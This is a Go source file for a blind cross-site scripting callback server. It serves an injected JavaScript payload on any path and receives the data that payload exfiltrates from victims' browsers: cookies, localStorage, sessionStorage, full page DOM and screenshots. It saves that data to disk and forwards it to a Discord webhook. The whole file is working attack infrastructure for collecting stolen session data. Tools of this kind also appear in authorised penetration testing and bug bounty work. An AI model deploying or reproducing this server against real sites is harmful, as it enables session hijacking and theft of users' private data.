package main

import (
	"bytes"
	"encoding/base64"
	"encoding/json"
	"flag"
	"fmt"
	"io"
	"log"
	"mime/multipart"
	"net/http"
	"os"
	"strings"
	"time"
)

type CallbackData struct {
	ID             string                 `json:"id"`
	URI            string                 `json:"uri"`
	Cookies        string                 `json:"cookies"`
	Referer        string                 `json:"referer"`
	UserAgent      string                 `json:"user-agent"`
	Origin         string                 `json:"origin"`
	LocalStorage   interface{}            `json:"localstorage"`
	SessionStorage interface{}            `json:"sessionstorage"`
	DOM            string                 `json:"dom"`
	Screenshot     string                 `json:"screenshot"`
	Extra          map[string]interface{} `json:"extra,omitempty"`
}

func main() {
	// Parse command line arguments
	var domain string
	var webhookURL string
	var verbose bool
	flag.StringVar(&domain, "domain", "localhost:8083", "Domain for the callback URL (e.g., 0.0.0.0.nip.io:8083)")
	flag.StringVar(&webhookURL, "webhook", "", "Discord webhook URL (required)")
	flag.BoolVar(&verbose, "v", false, "Enable verbose logging")
	flag.Parse()

	// Validate required arguments
	if webhookURL == "" {
		log.Fatal("Discord webhook URL is required. Use -webhook flag.")
	}

	// Set log level based on verbose flag
	if !verbose {
		log.SetOutput(io.Discard) // Disable all logging when not verbose
	}

	// Read the original JS file
	jsContent, err := os.ReadFile("bxss.js")
	if err != nil {
		log.Fatal("Error reading bxss.js:", err)
	}

	// Replace the callback URL placeholder with our server's callback endpoint
	callbackURL := fmt.Sprintf("http://%s/callback", domain)
	modifiedJS := strings.ReplaceAll(string(jsContent),
		`"CALLBACK_URL_PLACEHOLDER"`,
		callbackURL)

	// Handler for serving the JS payload on any path
	http.HandleFunc("/", func(w http.ResponseWriter, r *http.Request) {

		// Set CORS headers to allow cross-origin requests
		w.Header().Set("Access-Control-Allow-Origin", "*")
		w.Header().Set("Access-Control-Allow-Methods", "GET, POST, OPTIONS")
		w.Header().Set("Access-Control-Allow-Headers", "Content-Type, X-Requested-With")
		w.Header().Set("Access-Control-Allow-Credentials", "true")

		// Handle preflight requests
		if r.Method == "OPTIONS" {
			w.WriteHeader(http.StatusOK)
			return
		}

		// Create a unique version of the JS with the request path as ID
		requestPath := r.URL.Path
		if requestPath == "/" {
			requestPath = "/root"
		}

		// Add the path as a comment and modify the callback to include the path
		pathSpecificJS := fmt.Sprintf("// Served from path: %s\n", requestPath) + modifiedJS

		// Replace the callback URL to include the path as a query parameter
		pathSpecificJS = strings.ReplaceAll(pathSpecificJS,
			callbackURL,
			fmt.Sprintf(`"%s?path=%s"`, callbackURL, requestPath))

		// Serve the modified JS content
		w.Header().Set("Content-Type", "application/javascript")
		w.Write([]byte(pathSpecificJS))

		log.Printf("Served XSS payload to: %s from path: %s", r.RemoteAddr, requestPath)
	})

	// Handler for receiving callbacks
	http.HandleFunc("/callback", func(w http.ResponseWriter, r *http.Request) {
		// Set CORS headers for callback endpoint
		w.Header().Set("Access-Control-Allow-Origin", "*")
		w.Header().Set("Access-Control-Allow-Methods", "GET, POST, OPTIONS")
		w.Header().Set("Access-Control-Allow-Headers", "Content-Type, X-Requested-With")
		w.Header().Set("Access-Control-Allow-Credentials", "true")

		// Handle preflight requests
		if r.Method == "OPTIONS" {
			w.WriteHeader(http.StatusOK)
			return
		}

		if r.Method != "POST" {
			http.Error(w, "Method not allowed", http.StatusMethodNotAllowed)
			return
		}

		// Extract the path parameter from the URL
		pathParam := r.URL.Query().Get("path")
		if pathParam == "" {
			pathParam = "unknown"
		}

		// Read the request body
		body, err := io.ReadAll(r.Body)
		if err != nil {
			log.Printf("Error reading callback body: %v", err)
			http.Error(w, "Bad request", http.StatusBadRequest)
			return
		}
		defer r.Body.Close()

		// Try to parse as JSON first
		var callbackData CallbackData
		if err := json.Unmarshal(body, &callbackData); err != nil {
			// If JSON parsing fails, try to parse as form data
			log.Printf("JSON parsing failed, trying form data: %v", err)
			if err := r.ParseForm(); err == nil {
				callbackData.URI = r.FormValue("uri")
				callbackData.Cookies = r.FormValue("cookies")
				callbackData.Referer = r.FormValue("referer")
				callbackData.UserAgent = r.FormValue("user-agent")
				callbackData.Origin = r.FormValue("origin")
				callbackData.LocalStorage = r.FormValue("localstorage")
				callbackData.SessionStorage = r.FormValue("sessionstorage")
				callbackData.DOM = r.FormValue("dom")
				callbackData.Screenshot = r.FormValue("screenshot")
			}
		}

		// Set the ID to the path where the payload was served from
		callbackData.ID = pathParam

		// Always show callback notification
		fmt.Printf("🎯 XSS Callback from %s (Path: %s)\n", r.RemoteAddr, callbackData.ID)

		// Log the callback data (only in verbose mode)
		log.Printf("=== XSS CALLBACK RECEIVED ===")
		log.Printf("Time: %s", time.Now().Format("2006-01-02 15:04:05"))
		log.Printf("ID (Path): %s", callbackData.ID)
		log.Printf("Remote IP: %s", r.RemoteAddr)
		log.Printf("URI: %s", callbackData.URI)
		log.Printf("Origin: %s", callbackData.Origin)
		log.Printf("Referer: %s", callbackData.Referer)
		log.Printf("User-Agent: %s", callbackData.UserAgent)
		log.Printf("Cookies: %s", callbackData.Cookies)
		log.Printf("LocalStorage: %+v", callbackData.LocalStorage)
		log.Printf("SessionStorage: %+v", callbackData.SessionStorage)
		log.Printf("DOM Length: %d characters", len(callbackData.DOM))
		if len(callbackData.DOM) > 0 {
			log.Printf("DOM Preview: %s", callbackData.DOM[:min(200, len(callbackData.DOM))])
		}
		log.Printf("Screenshot: %s", callbackData.Screenshot)
		if callbackData.Extra != nil {
			log.Printf("Extra Data: %+v", callbackData.Extra)
		}
		log.Printf("================================")

		// Execute bash command (placeholder - you can customize this)
		go executeBashCommand(callbackData, webhookURL)

		// Return success response
		w.WriteHeader(http.StatusOK)
		w.Write([]byte("OK"))
	})

	port := ":8083"

	// Always show startup information
	fmt.Printf("🚀 XSS Callback Server Starting...\n")
	fmt.Printf("📍 Port: %s\n", port)
	fmt.Printf("🌐 Domain: %s\n", domain)
	fmt.Printf("🔗 Callback URL: %s\n", callbackURL)
	fmt.Printf("📡 XSS payload will be served on any path\n")
	fmt.Printf("📥 Callbacks will be received at /callback\n")
	fmt.Printf("🔕 Verbose logging: %t\n", verbose)
	fmt.Printf("✅ Server ready!\n\n")

	log.Fatal(http.ListenAndServe(port, nil))
}

func min(a, b int) int {
	if a < b {
		return a
	}
	return b
}

func executeBashCommand(data CallbackData, webhookURL string) {
	// Send Discord webhook instead of bash command
	sendDiscordWebhook(data, webhookURL)
}

func sendDiscordWebhook(data CallbackData, webhookURL string) {
	// Save all data to files
	saveCallbackData(data)

	// Create Discord embed
	embed := map[string]interface{}{
		"title":     "🚨 XSS Callback Detected!",
		"color":     16711680, // Red color
		"timestamp": time.Now().Format(time.RFC3339),
		"fields":    []map[string]interface{}{},
		"footer": map[string]interface{}{
			"text": "Blind XSS Callback Server",
		},
	}

	// Add fields for the data
	fields := []map[string]interface{}{
		{
			"name":   "🔗 Path ID",
			"value":  data.ID,
			"inline": true,
		},
		{
			"name":   "🌐 URI",
			"value":  truncateString(data.URI, 1024),
			"inline": false,
		},
		{
			"name":   "📍 Origin",
			"value":  truncateString(data.Origin, 1024),
			"inline": true,
		},
		{
			"name":   "📄 Referer",
			"value":  truncateString(data.Referer, 1024),
			"inline": false,
		},
		{
			"name":   "🤖 User-Agent",
			"value":  "```\n" + truncateString(data.UserAgent, 1000) + "\n```",
			"inline": false,
		},
		{
			"name":   "🍪 Cookies",
			"value":  "```\n" + truncateString(data.Cookies, 1000) + "\n```",
			"inline": false,
		},
	}

	// Add localStorage and sessionStorage if they exist
	if data.LocalStorage != nil {
		localStorageStr := formatStorage(data.LocalStorage)
		if localStorageStr != "" {
			fields = append(fields, map[string]interface{}{
				"name":   "💾 LocalStorage",
				"value":  "```\n" + truncateString(localStorageStr, 1000) + "\n```",
				"inline": false,
			})
		}
	}

	if data.SessionStorage != nil {
		sessionStorageStr := formatStorage(data.SessionStorage)
		if sessionStorageStr != "" {
			fields = append(fields, map[string]interface{}{
				"name":   "📦 SessionStorage",
				"value":  "```\n" + truncateString(sessionStorageStr, 1000) + "\n```",
				"inline": false,
			})
		}
	}

	// Add DOM length (not the full content)
	if len(data.DOM) > 0 {
		fields = append(fields, map[string]interface{}{
			"name":   "📄 DOM",
			"value":  fmt.Sprintf("**Length:** %d characters\n\n**Preview:**\n```html\n%s\n```", len(data.DOM), truncateString(data.DOM[:min(500, len(data.DOM))], 1000)),
			"inline": false,
		})
	}

	// Add screenshot info
	if data.Screenshot != "" {
		fields = append(fields, map[string]interface{}{
			"name":   "📸 Screenshot",
			"value":  fmt.Sprintf("**Captured:** ✅\n**Data URL Length:** %d characters", len(data.Screenshot)),
			"inline": false,
		})
	}

	// Add extra data if it exists
	if data.Extra != nil && len(data.Extra) > 0 {
		extraStr := formatExtraData(data.Extra)
		fields = append(fields, map[string]interface{}{
			"name":   "➕ Extra Data",
			"value":  "```\n" + truncateString(extraStr, 1000) + "\n```",
			"inline": false,
		})
	}

	embed["fields"] = fields

	// If there's a screenshot, send everything as multipart with file attachment
	if data.Screenshot != "" {
		sendDiscordWebhookWithScreenshot(webhookURL, embed, data.Screenshot, data.ID)
	} else {
		// Send just the embed without screenshot
		sendDiscordWebhookEmbedOnly(webhookURL, embed)
	}
}

func formatStorage(storage interface{}) string {
	if storage == nil {
		return ""
	}

	// Try to parse as JSON string first
	if str, ok := storage.(string); ok {
		var parsed map[string]interface{}
		if err := json.Unmarshal([]byte(str), &parsed); err == nil {
			// Format as key-value pairs
			var result []string
			for key, value := range parsed {
				result = append(result, fmt.Sprintf("%s: %v", key, value))
			}
			return strings.Join(result, "\n")
		}
		// If not JSON, return as is
		return str
	}

	// If it's already a map
	if m, ok := storage.(map[string]interface{}); ok {
		var result []string
		for key, value := range m {
			result = append(result, fmt.Sprintf("%s: %v", key, value))
		}
		return strings.Join(result, "\n")
	}

	// Fallback to string representation
	return fmt.Sprintf("%v", storage)
}

func saveCallbackData(data CallbackData) {
	// Sanitize the ID for use as directory name
	safeID := strings.ReplaceAll(data.ID, "/", "_")
	if safeID == "" {
		safeID = "unknown"
	}

	// Create timestamp for unique identification
	timestamp := time.Now().Format("20060102_150405")

	// Create directory for this callback
	dirPath := fmt.Sprintf("callbacks/%s_%s", safeID, timestamp)
	if err := os.MkdirAll(dirPath, 0755); err != nil {
		log.Printf("Error creating callback directory: %v", err)
		return
	}

	// Save data.json with all callback information
	dataJSON := map[string]interface{}{
		"id":             data.ID,
		"timestamp":      time.Now().Format(time.RFC3339),
		"uri":            data.URI,
		"cookies":        data.Cookies,
		"referer":        data.Referer,
		"userAgent":      data.UserAgent,
		"origin":         data.Origin,
		"localStorage":   data.LocalStorage,
		"sessionStorage": data.SessionStorage,
		"screenshot":     data.Screenshot,
		"extra":          data.Extra,
	}

	jsonData, err := json.MarshalIndent(dataJSON, "", "  ")
	if err != nil {
		log.Printf("Error marshaling data JSON: %v", err)
		return
	}

	if err := os.WriteFile(fmt.Sprintf("%s/data.json", dirPath), jsonData, 0644); err != nil {
		log.Printf("Error saving data.json: %v", err)
		return
	}

	// Save dom.html with the full DOM content
	if data.DOM != "" {
		htmlContent := fmt.Sprintf(`<!DOCTYPE html>
<html>
<head>
    <title>XSS Callback DOM - %s</title>
    <meta charset="utf-8">
    <style>
        body { font-family: Arial, sans-serif; margin: 20px; }
        .info { background: #f0f0f0; padding: 10px; margin-bottom: 20px; border-radius: 5px; }
        .dom-content { border: 1px solid #ccc; padding: 10px; background: #fafafa; }
    </style>
</head>
<body>
    <div class="info">
        <h2>XSS Callback Information</h2>
        <p><strong>ID:</strong> %s</p>
        <p><strong>Timestamp:</strong> %s</p>
        <p><strong>URI:</strong> %s</p>
        <p><strong>Origin:</strong> %s</p>
    </div>
    <div class="dom-content">
        <h3>Full DOM Content:</h3>
        %s
    </div>
</body>
</html>`, data.ID, data.ID, time.Now().Format(time.RFC3339), data.URI, data.Origin, data.DOM)

		if err := os.WriteFile(fmt.Sprintf("%s/dom.html", dirPath), []byte(htmlContent), 0644); err != nil {
			log.Printf("Error saving dom.html: %v", err)
		}
	}

	// Save screenshot if available
	if data.Screenshot != "" {
		if err := saveScreenshotToFile(data.Screenshot, fmt.Sprintf("%s/screenshot.jpg", dirPath)); err != nil {
			log.Printf("Error saving screenshot: %v", err)
		}
	}

	log.Printf("Callback data saved to: %s", dirPath)
}

func saveScreenshotToFile(dataURL, filepath string) error {
	// Extract base64 data from data URL
	if !strings.HasPrefix(dataURL, "data:image/") {
		return fmt.Errorf("invalid data URL format")
	}

	// Parse the data URL
	parts := strings.Split(dataURL, ",")
	if len(parts) != 2 {
		return fmt.Errorf("invalid data URL format")
	}

	// Decode base64
	data, err := base64.StdEncoding.DecodeString(parts[1])
	if err != nil {
		return fmt.Errorf("error decoding base64: %v", err)
	}

	// Save file
	if err := os.WriteFile(filepath, data, 0644); err != nil {
		return fmt.Errorf("error writing file: %v", err)
	}

	return nil
}

func formatExtraData(extra map[string]interface{}) string {
	if extra == nil || len(extra) == 0 {
		return ""
	}

	var result []string
	for key, value := range extra {
		result = append(result, fmt.Sprintf("%s: %v", key, value))
	}
	return strings.Join(result, "\n")
}

func truncateString(s string, maxLen int) string {
	if len(s) <= maxLen {
		return s
	}
	return s[:maxLen-3] + "..."
}

func sendScreenshotAsAttachment(webhookURL, dataURL, pathID string) {
	// Extract base64 data from data URL
	if !strings.HasPrefix(dataURL, "data:image/") {
		return
	}

	// Parse the data URL
	parts := strings.Split(dataURL, ",")
	if len(parts) != 2 {
		return
	}

	// Decode base64
	data, err := base64.StdEncoding.DecodeString(parts[1])
	if err != nil {
		log.Printf("Error decoding screenshot for attachment: %v", err)
		return
	}

	// Create multipart form data
	var buf bytes.Buffer
	writer := multipart.NewWriter(&buf)

	// Add the JSON payload
	payload := map[string]interface{}{
		"content": fmt.Sprintf("📸 Screenshot for path: %s", pathID),
	}
	payloadJSON, _ := json.Marshal(payload)
	field, _ := writer.CreateFormField("payload_json")
	field.Write(payloadJSON)

	// Add the file
	part, _ := writer.CreateFormFile("file", fmt.Sprintf("screenshot_%s.jpg", strings.ReplaceAll(pathID, "/", "_")))
	part.Write(data)

	writer.Close()

	// Send the request
	req, err := http.NewRequest("POST", webhookURL, &buf)
	if err != nil {
		log.Printf("Error creating screenshot request: %v", err)
		return
	}

	req.Header.Set("Content-Type", writer.FormDataContentType())

	client := &http.Client{}
	resp, err := client.Do(req)
	if err != nil {
		log.Printf("Error sending screenshot attachment: %v", err)
		return
	}
	defer resp.Body.Close()

	if resp.StatusCode == 204 {
		log.Printf("Screenshot attachment sent successfully")
	} else {
		body, _ := io.ReadAll(resp.Body)
		log.Printf("Screenshot attachment failed with status %d: %s", resp.StatusCode, string(body))
	}
}

func sendDiscordWebhookEmbedOnly(webhookURL string, embed map[string]interface{}) {
	// Create Discord message
	discordMessage := map[string]interface{}{
		"embeds": []map[string]interface{}{embed},
	}

	// Convert to JSON
	jsonData, err := json.Marshal(discordMessage)
	if err != nil {
		log.Printf("Error marshaling Discord message: %v", err)
		return
	}

	log.Printf("Discord payload size: %d bytes", len(jsonData))

	// Send to Discord webhook
	resp, err := http.Post(webhookURL, "application/json", bytes.NewBuffer(jsonData))
	if err != nil {
		log.Printf("Error sending Discord webhook: %v", err)
		return
	}
	defer resp.Body.Close()

	if resp.StatusCode == 204 {
		log.Printf("Discord webhook sent successfully")
	} else {
		body, _ := io.ReadAll(resp.Body)
		log.Printf("Discord webhook failed with status %d: %s", resp.StatusCode, string(body))
	}
}

func sendDiscordWebhookWithScreenshot(webhookURL string, embed map[string]interface{}, dataURL, pathID string) {
	// Extract base64 data from data URL
	if !strings.HasPrefix(dataURL, "data:image/") {
		log.Printf("Invalid screenshot data URL format")
		return
	}

	// Parse the data URL
	parts := strings.Split(dataURL, ",")
	if len(parts) != 2 {
		log.Printf("Invalid screenshot data URL format")
		return
	}

	// Decode base64
	data, err := base64.StdEncoding.DecodeString(parts[1])
	if err != nil {
		log.Printf("Error decoding screenshot for attachment: %v", err)
		return
	}

	// Create filename for the screenshot
	filename := fmt.Sprintf("screenshot_%s.jpg", strings.ReplaceAll(pathID, "/", "_"))

	// Add the image to the embed using attachment://
	embed["image"] = map[string]interface{}{
		"url": fmt.Sprintf("attachment://%s", filename),
	}

	// Create multipart form data
	var buf bytes.Buffer
	writer := multipart.NewWriter(&buf)

	// Add the JSON payload with embed
	payload := map[string]interface{}{
		"embeds": []map[string]interface{}{embed},
	}
	payloadJSON, _ := json.Marshal(payload)
	field, _ := writer.CreateFormField("payload_json")
	field.Write(payloadJSON)

	// Add the file with the same filename used in the embed
	part, _ := writer.CreateFormFile("file", filename)
	part.Write(data)

	writer.Close()

	// Send the request
	req, err := http.NewRequest("POST", webhookURL, &buf)
	if err != nil {
		log.Printf("Error creating webhook request: %v", err)
		return
	}

	req.Header.Set("Content-Type", writer.FormDataContentType())

	client := &http.Client{}
	resp, err := client.Do(req)
	if err != nil {
		log.Printf("Error sending webhook with screenshot: %v", err)
		return
	}
	defer resp.Body.Close()

	if resp.StatusCode == 204 {
		log.Printf("Discord webhook with screenshot sent successfully")
	} else {
		body, _ := io.ReadAll(resp.Body)
		log.Printf("Discord webhook with screenshot failed with status %d: %s", resp.StatusCode, string(body))
	}
}
